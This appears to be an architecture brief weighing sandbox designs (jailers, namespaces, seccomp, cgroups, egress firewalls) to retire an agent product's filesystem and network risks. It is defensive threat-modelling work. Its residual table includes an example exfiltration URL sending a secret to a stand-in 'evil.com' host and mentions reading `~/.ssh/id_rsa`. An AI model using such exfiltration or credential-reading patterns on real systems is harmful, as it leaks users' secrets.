# Architect brief — P4.3: Posture-B syscall/egress sandbox (decision-surface)

**Task:** P4.3 (A1) — the **real FS/network/syscall sandbox** that retires the accumulated honest residuals B3/B4/B5 + ADR-031 inscribed as deferred-to-P4.3. The **Wave-2 trust-hardening opener** (P4-roadmap §4: capability → **trust hardening** → completeness), and the **foundation P4.4** (plugin registry/lifecycle/signature) depends on (roadmap §4 `P4.3 → P4.4`).

**Class:** heaviest infra slice to date. `requires_cross_family_review: true` (mandatory dual-lens, roadmap §8). **New ADR-037.**

**Status of this doc:** a **DECISION-SURFACE**, not a plan and not a set of decisions. Five novel-infra decision points below carry **architect-ratifiable leans + tradeoffs**; the architect-partner does **not** decide. No plan/ADR-037 is drafted until the architect ratifies the load-bearing calls (≥ DP1, DP2, DP4).

---

## 0. Why now + what it retires (the closed residual ledger — verify-cited `origin/main`)

P4.2 shipped the heavy tool surfaces (B3 subprocess / B4 network / B5 mutation) **before** the sandbox, each Accepting an honest `RB-FS/NET`-class residual **on one named retirement path: "the sandbox WRAPS the existing exec; the app-level scoping does not reverse"** (ADR-034 D2 ¶forward-watch; ADR-035 D2 ¶forward-watch; ADR-031 D1a Reversibility). P4.3 is that retirement. It does **not** rebuild the execution substrate — it wraps it.

**The ledger P4.3 must retire / bound (each Accepted + inscribed, gated today — none a live incident):**

| # | Residual | Source (verify) | Surface | Retired by |
|---|---|---|---|---|
| R1 | **`RB-FS/NET` (origin)** — activated fetched plugin subprocess runs with host user's full FS-read + outbound-net privilege (`open()` `~/.ssh/id_rsa`, `socket()` out); env/secret/DoS-scoped, **not** syscall-sandboxed | ADR-031 D1a; Reversibility | subprocess (`plugins/code.py` `_PostureBFn` → `subprocess_mcp_stdio`) | FS + net isolation |
| R2 | **`RB-FS/NET`(B3)** — the 5 subprocess tools + (B5) `git_push` run via `run_scoped_command` with operator FS-read + outbound-net privilege; `run_tests` largest (executes workspace code) | ADR-034 D2; `subprocess_trust.py:202` | subprocess (`run_scoped_command`) | FS + net isolation |
| R3 | **`setpgid`-escape kill residual** — `start_new_session=True` → `killpg`+watchdog covers the common case; a grandchild calling `setpgid(0,0)` escapes both → can orphan | ADR-034 D4; `subprocess_trust.py:154,245-268,276-285` | subprocess | PID-namespace / cgroup subtree-kill |
| R4 | **network half of `RB-FS/NET` (ACTIVE)** — `web_fetch` agent-chosen URL; app-level SSRF floor blocks internal/metadata reach but **public-host data-exfil is NOT prevented** (`https://evil.com/?d=<secret>`) | ADR-035 D2, D3-ii; `net_trust.py:40-63,125` | **in-process** httpx | egress firewall / netns |
| R5 | **DNS-executor head-of-line** — `ThreadPoolExecutor(max_workers=1)` for `getaddrinfo`; `future.cancel()` can't interrupt a running resolve → a hung resolver poisons the one worker (capability-DoS, process-wide) | ADR-035 impl-degradation ¶; `net_trust.py:37,86-94` | in-process | per-call/daemon executor or async true-cancel (folds into P4.3) |

| R8 | **`git_push` exfil-by-remote** — `remote` accepts an arbitrary URL → push repo to attacker (my impl-stage N1, architect-routed α-inscribed) | ADR-036 D3-iii | subprocess | egress firewall |
| R9 | **`send_email` exfil-by-recipient** — agent mails secret to an allowed-domain address; bounded by domain-allowlist, not eliminated | ADR-036 D3-ii; Reversibility | **in-process** httpx (fixed endpoint) | egress firewall **+ DLP** (see DP2 nuance) |

**The seam that matters (and the dispatch's framing tension):** R1/R2/R3/R8 are **subprocess** residuals — a sandbox that spawns children inside it retires them naturally. But **R4/R5/R7/R9 are IN-PROCESS** (`web_fetch`/`send_email` are in-process `httpx`, ADR-035 D4 ¶"why in-process, not subprocess"; `apply_edit` is in-process FS, ADR-036 D4). A per-subprocess sandbox does **nothing** for in-process egress/FS. This couples DP2 and DP3 — see below.

## 1. ⭐⭐ DP1 — Sandbox technology (THE load-bearing call; drives everything)

**Environment evidence (verified, this WSL2 dev box — `uname`: `…microsoft-standard-WSL2`):**
- **Docker:** CLI present but it is the **Windows Docker Desktop** binary (`/mnt/c/Program Files/Docker/…`); **daemon NOT reachable** by default. Containers need Docker Desktop running on Windows.
- **podman / bubblewrap / nsjail / gVisor(runsc) / firejail:** **ALL ABSENT** — any of these is a **new system dependency** to install.
- **Raw Linux namespaces:** **work unprivileged here** — `unshare -Urn` (user+net namespace) succeeds; `max_user_namespaces=63789`; **cgroup v2** mounted (`cgroup2fs`); **seccomp-bpf** available (`util-linux` `unshare`/`setpriv` present). No external dep.

| Option | Strength | Deps / portability | Work | Honest read in THIS env |
|---|---|---|---|---|
| **OS containers** (Docker / podman) | Strong, ubiquitous, well-understood | **Heavy external dep**; Docker here = Windows-side daemon, **often down**; podman absent | Low-Med (orchestrate runtime) | The "obvious" choice carries the **worst availability story here** — fail-closed would block all tools whenever Docker Desktop is off |
| **Lightweight jailers** (bubblewrap / nsjail) | Strong (namespaces + seccomp + bind-mounts); battle-tested (Flatpak/Chrome-style) | **One** new system-binary dep (apt); Linux-only (fine — prod is Linux) | Med (wrap the binary, build the profile) | **The sweet spot** — far less code than raw, no daemon, runs in this WSL2 kernel; cost is the single binary dep |
| **gVisor** (runsc, syscall interception) | Strongest isolation (user-space kernel) | Heavy; wants KVM or ptrace mode; **absent**; WSL2-nested-virt friction | Med-High | Overkill for first-party fixed-argv commands; heaviest to stand up in WSL2 |
| **Raw namespaces + seccomp + cgroups v2** (in-process `clone`/`unshare`/`setns`) | Strong (you build exactly the boundary) | **Zero external dep** (works here today); most portable | **High** (most engineering; the long tail — UID maps, mount setup, seccomp BPF, cgroup wiring — is yours) | Maximum portability + zero dep; the classic "you reimplement a jailer" cost + the WSL-edge-case tail |

**Architect-partner lean: bubblewrap/nsjail (lightweight jailer), with raw-namespaces as the zero-dep fallback if a "no new system dependency" constraint is firm.** Rationale: (a) Docker's availability in the actual dev env is the weakest of the four (daemon-down by default) — a poor base for a fail-closed posture (DP4); (b) the workload is **first-party fixed-argv commands over a trusted workspace** (ADR-034 D2) — gVisor-grade syscall interception is more than the threat needs; (c) bwrap/nsjail gives namespaces+seccomp+bind-mounts for **one** dep and a fraction of raw-namespace code. **This is the call that drives DP2/DP3 — architect ratifies first.** (If the architect weights "zero new dep / runs unmodified anywhere" highest → raw namespaces; if "strongest containment, deps acceptable" → containers/gVisor.)

## 2. ⭐ DP2 — Isolation scope + strength (which dimensions A1 ships; which stay residual)

The sandbox can bound up to five dimensions. **Which does P4.3 ship, and which stay an (honestly-inscribed) residual?**

| Dimension | Retires | Mechanism | Lean |
|---|---|---|---|
| **FS** (read-only rootfs + sandbox-mount only) | R1, R2 (FS half), R7 | mount-namespace + bind-mount only the workspace rw, rest ro/absent | **Ship** — the core of `RB-FS` |
| **Network** (egress boundary) | R1/R2 (net half), R4, R8 | net-namespace + egress allowlist (or deny-by-default) | **Ship for the subprocess surface; DP3-coupled for in-process** |
| **Syscall** (seccomp allowlist) | hardening over R1/R2 | seccomp-bpf default-deny + allowlist | **Ship a conservative allowlist** (kill `ptrace`/`mount`/`keyctl`/raw-net); a tight list is the long tail |
| **UID** (userns / unprivileged) | privilege-escalation hardening | user-namespace, map to nobody | **Ship** (free with namespaces; works unprivileged here) |
| **Resources** (cgroup v2: CPU/mem/pids/time) | strengthens R3 + the ADR-028 D5 liveness bound | cgroup v2 limits + subtree-kill | **Ship** — also the clean fix for R3 (`setpgid`-escape: cgroup kills the whole subtree regardless of pgid) |

**Two honest sub-calls the architect should weigh:**

1. **Egress: deny-by-default vs operator-allowlist vs metadata-floor-only.** A real egress firewall finally bounds R4/R8 — but the **orchestrator process itself needs legitimate outbound** (LLM APIs, remote MCP, the `web_search`/`send_email` providers). A blanket boundary that's too tight breaks the product; too loose doesn't retire the exfil. The clean resolution is **per-agent-egress isolation** (the sandboxed *child* gets the restrictive egress; the orchestrator keeps its own) — which is **why DP3 matters** (route in-process egress through a sandboxed child). **Lean: deny-by-default egress inside the sandbox + an operator allowlist knob** (the ADR-035 D2 named tightening, now enforced at the namespace).

2. **The `send_email` exfil-by-recipient (R9) nuance — a netns does NOT fully retire it.** An egress namespace controls **which hosts** the process reaches; `send_email` reaches an **allowed operator provider endpoint** and the exfil is in the **recipient** (an allowed-domain address). So a netns bounds `send_email`'s *transport reachability* but the within-allowed-domain exfil stays an **application/DLP** concern (ADR-036 D3-ii already says "full prevention is a deployment/DLP concern"). **Surface honestly:** P4.3 should **not** claim to retire R9 — it bounds the transport; the recipient-exfil residual persists past P4.3 (a DLP/egress-allowlist deployment concern). Same shape for R8 if the operator allowlist permits a broad host set.

**Lean: ship FS + network(deny-default) + syscall(conservative) + UID + cgroup. Inscribe what stays residual:** R6 (NAT64 — an app-level floor extension, not a container concern; fold in), the R9 recipient-exfil DLP tail, and whatever syscall-allowlist breadth is deferred.

## 3. ⭐ DP3 — What it wraps + the seam (one interface vs per-surface; the in-process wrinkle; liveness)

**The subprocess surface is easy; the in-process surface is the real decision.**

- **Subprocess (R1/R2/R3/R8):** wrap at **one** seam — `run_scoped_command` (`subprocess_trust.py:202`, used by B3 tools + `git_push`) **and** the Posture-B harness spawn (`plugins/code.py` `_PostureBFn` → `subprocess_mcp_stdio`). Both already funnel through `subprocess_trust.py` with `start_new_session=True`; the sandbox replaces/wraps that spawn. **One sandbox interface for all subprocess exec** is the ADR-034/035 "one retirement path" — **lean: yes, one interface** (a `sandboxed_spawn` the existing entrypoints call), not per-tool.

- **In-process egress (R4 `web_fetch`, R9 `send_email`):** these are **in-process `httpx`** (ADR-035 D4 chose in-process *specifically because a subprocess bought no isolation pre-sandbox*). Post-sandbox that calculus **flips**: to give agent-induced egress a restrictive netns **without** netns-ing the whole orchestrator, the cleanest path is to **route `web_fetch` (and possibly `send_email`) egress through a sandboxed subprocess** after all. **This is a real, surface-worthy reversal of an ADR-035 decision** — options: (a) move agent egress to a sandboxed child (per-call netns; cleanest isolation; reintroduces a fork + re-homes the SSRF validator); (b) netns the **whole orchestrator** with an allowlist that still permits LLM/MCP (ADR-035's literal "network-namespace the process" — but hard to separate orchestrator-egress from agent-egress in one process); (c) keep `web_fetch` app-level (SSRF floor stays, R4 **not** retired — only the subprocess surface gets real isolation). **Lean: (a)** for `web_fetch`; **flag (c)** as the honest "what if we only sandbox subprocesses" fallback that leaves R4/R9 as named residuals.

- **In-process FS (R7 `apply_edit`):** a subprocess sandbox does **nothing** for in-process FS writes. Retire R7 either by (a) routing `apply_edit` through the sandboxed FS child, or (b) an **app-level** `openat2(RESOLVE_NO_SYMLINKS)` / dir-fd walk (a syscall-level fix, **not** a container — arguably the leaner retirement for one in-process writer). **Lean: (b)** — R7 is a narrow app-level hardening; don't force `apply_edit` into a subprocess just to reuse the container.

**Liveness + empty-executor-diff (the constraints, not decisions):**
- **Single-writer bound (ADR-028 D5):** the sandbox runs inline on the `max_workers=1` writer; **setup/teardown latency adds to the block × `(1+N)` passes** (ADR-033 D4). **Sandbox-per-call** (fresh namespace each call — clean isolation, per-call setup cost) **vs persistent/warm sandbox** (lower latency, but cross-call state-leak + lifecycle complexity). **Lean: per-call** (isolation correctness > latency; measure + bound the setup term as the new finite term in the D5 budget — the R0-B liveness probe).
- **Empty-executor-diff (ADR-028 D6, 4×):** the wrap lives **below** the executor (in `subprocess_trust`/`net_trust`), so `_execute_local_call` stays byte-frozen. **Constraint to preserve** — the sandbox is a substrate change, not an executor-decision change.

## 4. ⭐ DP4 — Posture + graceful degradation (the major honest-posture call)

**Two orthogonal calls:**

1. **Opt-in vs default-on.** Is the sandbox **on by default** (every subprocess/egress sandboxed) or **operator-activated** (config flag)? Today's residuals are "Accepted + gated by operator activation" (ADR-031 D1a) — but P4.3's whole point is to **retire** them, which argues default-on. **Lean: default-on where the runtime is available; operator-config to select the runtime + the egress allowlist.**

2. **⭐⭐ Fail-closed vs fail-open when the sandbox runtime is UNAVAILABLE** (no Docker daemon / no userns / no seccomp — a live scenario in this WSL2 env where Docker's daemon is down). This is the sharpest honest-posture call in P4.3:
   - **Fail-closed** (no subprocess/egress without a working sandbox): **maximally safe**, but **breaks the flagship loop** whenever the runtime is absent (e.g. Docker Desktop off) — the B3/B4/B5 tools become unavailable, not just unsandboxed.
   - **Fail-open-to-today** (fall back to the current app-level posture — scoped-env + SSRF-floor + `_check_path`): **preserves capability**, but **silently re-exposes the very `RB-FS/NET` residual P4.3 exists to retire** — and a silent fallback is exactly the "softened surface" the honest-residual discipline forbids (roadmap §10).
   - **Middle (lean):** **fail-closed by default, with an explicit operator opt-in to the degraded app-level posture** that is **loudly logged + surfaced** (never silent). The operator consciously chooses "run unsandboxed" exactly as they consciously activate a fetched plugin today (ADR-031 D4). This preserves the honest-posture discipline (no silent fallback) while not bricking dev environments where the runtime is unavailable.

   **This is an architect call, not a lean to bank** — it's a posture decision of the same weight as Accepting `RB-FS/NET` itself. Surfaced with the middle option as my lean; the architect ratifies the fail-mode.

## 5. ⭐ DP5 — New residuals P4.3 leaves + ADR-037 + the dual-lens prompt

**P4.3 will leave its own honest residuals — inscribe them, don't soften (roadmap §10, the ADR-029 D4 / ADR-031 D1a discipline):**
- **R9 recipient-exfil + R8-if-broad-allowlist** — bounded transport, not eliminated; a DLP/deployment tail past P4.3 (DP2 nuance).
- **Sandbox-escape surface** — the sandbox is new security code with its own escape history (userns CVEs, seccomp-hole syscalls, mount/proc leaks, time-of-check races on the bind setup). The dual-lens R0-B must probe it against a **container-escape checklist**.
- **Degraded-posture residual (if DP4 = fail-open-opt-in)** — the named, loud fallback path.
- **Per-call setup latency** — the new finite term in the D5 single-writer budget.

**ADR-037 (new contract):** the sandbox interface + isolation profile + posture/fail-mode + the residual inscription. Expensive-to-change (broad producers — every subprocess/egress — bind to it), so **inscribe-before-producer** (roadmap §10, RC-23-safe). Annotates/narrows **ADR-031 D1a, ADR-034 D2/D4, ADR-035 D2, ADR-036 D3** (the residuals it retires → mark resolved/narrowed at impl, matching the eventual Accepted status, the B3/B4/B5 precedent).

**Review posture:** `requires_cross_family_review: true` — **mandatory dual-lens** (roadmap §8, the P3.5/P3.7-remote/ADR-035 pattern). Plan-stage needs a **`docs/process/reviews/P4.3/external-r0b-prompt.md`** (the ADR-035/P3.6 precedent) with two lenses: **(a) sandbox setup/teardown liveness under the single writer** (the D5 budget term, per-call vs persistent, hung-runtime degradation); **(b) isolation-completeness threat-probe** (the container-escape checklist: userns/seccomp gaps, mount/proc/`/sys` leaks, egress-boundary bypass, the in-process surfaces DP3 leaves un-sandboxed, the fail-mode of DP4).

## 6. Constitutional carry-forward watch-list (carry into the plan + ADR-037)

- **Gate unchanged / executor-decision-free** — the sandbox is a **substrate** wrap below `_execute_local_call`; the gate stays the sole chokepoint, `_execute_local_call` byte-frozen (empty-executor-diff 5×; ADR-028 D6, ADR-031 HR#2).
- **No new `LLMPurpose`** — pure infra; no judgment/routing LLM call enters the sandbox path (roadmap §10).
- **Honest-residual inscription** — Accept the *real* post-P4.3 surface (DP5), never a softened one; **no silent fail-open** (DP4). The discipline that governed `RB-FS/NET`'s creation now governs its retirement.
- **Single-writer liveness (ADR-028 D5)** — the sandbox setup/teardown is a new finite term; bound it, don't let it become the unbounded term (the R5 lesson).
- **One retirement path** — the sandbox wraps the existing exec; the B3/B4/B5 app-level scoping (scoped-env, SSRF floor, `_check_path`) is **defense-in-depth that does not reverse** (ADR-034/035 Reversibility).
